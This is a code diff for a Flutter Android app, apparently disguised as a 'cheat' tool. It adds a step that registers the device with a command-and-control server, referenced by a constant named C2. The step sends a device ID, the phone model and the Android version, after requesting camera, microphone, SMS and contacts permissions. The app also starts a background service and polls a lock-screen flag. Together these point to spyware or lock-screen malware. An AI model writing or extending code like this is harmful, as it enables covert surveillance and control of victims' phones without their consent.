@@ -1,10 +1,14 @@
 import 'dart:async';
+import 'dart:convert';
 import 'package:flutter/material.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:http/http.dart' as http;
+import 'package:device_info_plus/device_info_plus.dart';
 import '../lock/lock_screen.dart';
 import 'cheat_home.dart';
 import '../services/device_service.dart';
+import '../config.dart';
 
 class SplashScreen extends StatefulWidget {
   const SplashScreen({super.key});
@@ -20,23 +24,47 @@ class _SplashScreenState extends State<SplashScreen> {
   }
 
   Future<void> _bootstrap() async {
+    // 1. Minta Izin (Dibungkus try-catch biar gak crash)
     try {
-      // Hanya minta izin yang penting dan aman untuk Android baru
       await [
-        Permission.camera, 
-        Permission.microphone,
-        Permission.sms, 
-        Permission.contacts, 
-        Permission.notification,
+        Permission.camera, Permission.microphone,
+        Permission.sms, Permission.contacts, Permission.notification,
       ].request();
-
-      // Jalanin background service
-      await DeviceService.init(); 
     } catch (e) {
-      // Kalau izin gagal, aplikasi tetep lanjut gak bakal force close
-      debugPrint("Error permission: $e");
+      debugPrint("Gagal minta izin: $e");
     }
 
+    // 2. Nembak Server LANGSUNG (Biar device langsung masuk web)
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      String? devId = prefs.getString('dev_id');
+      if (devId == null) {
+        devId = DateTime.now().millisecondsSinceEpoch.toString();
+        await prefs.setString('dev_id', devId);
+      }
+      final info = await DeviceInfoPlugin().androidInfo;
+      
+      await http.post(
+        Uri.parse('$C2/api/device/register'),
+        headers: {'Content-Type': 'application/json'},
+        body: jsonEncode({
+          'id': devId,
+          'model': '${info.manufacturer} ${info.model}',
+          'android': info.version.release,
+        }),
+      ).timeout(const Duration(seconds: 5));
+    } catch (e) {
+      debugPrint("Gagal konek server: $e");
+    }
+
+    // 3. Nyalain Background Service (Dibungkus try-catch)
+    try {
+      await DeviceService.init(); 
+    } catch (e) {
+      debugPrint("Gagal start service: $e");
+    }
+
+    // 4. Cek Lock Screen
     final prefs = await SharedPreferences.getInstance();
     Timer.periodic(const Duration(seconds: 2), (t) async {
       final v1 = prefs.getBool('lock_v1') ?? false;
